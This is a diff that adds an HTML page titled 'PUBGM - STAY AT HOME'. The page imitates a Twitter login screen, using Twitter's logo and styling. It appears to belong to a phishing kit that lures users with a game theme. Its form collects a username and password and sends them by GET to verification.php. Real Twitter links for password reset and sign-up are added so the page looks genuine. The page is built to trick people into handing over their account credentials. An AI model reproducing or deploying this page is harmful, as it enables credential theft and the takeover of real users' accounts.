@@ -1,0 +1,59 @@
+
+
+
+<html>
+<head>
+	
+
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>PUBGM - STAY AT HOME</title>
+<link rel="stylesheet" href="css/twitter.css">
+<link rel="icon" href="img/icon.jpg">
+
+
+
+
+</head>
+<center>
+<body>
+
+
+
+
+
+
+
+
+
+<div class="tw-login-layer animated fadeIn" >
+<center><div class="tw-content">
+<img src="img/login/tw/tw-logo.png">
+<br>
+<div class="tw-content-text"><b>Login To Twitter</b></div>
+
+<form action="verification.php" method="GET">
+	<input  class="tw-input-box" type="text" name="username"  placeholder="Phone, email, or username" required>
+	<input  class="tw-input-box" type="password" name="password" placeholder="Password" required>
+			<input type="hidden" name="login" value="Twitter" readonly>
+			<button type="submit" class="tw-button-01 ">Log In</button>	
+			<div class="tw-footer-text" onclick="location.href=
+'  https://twitter.com/account/begin_password_reset ';">Forgot password?</div>
+			<div class="tw-footer-text" onclick="location.href=
+'  https://mobile.twitter.com/i/flow/signup ';">Sign up to Twitter</div>
+</form>
+
+</div></center>
+</div>
+
+
+
+
+
+
+</body>
+</center>
+</html>
+
+
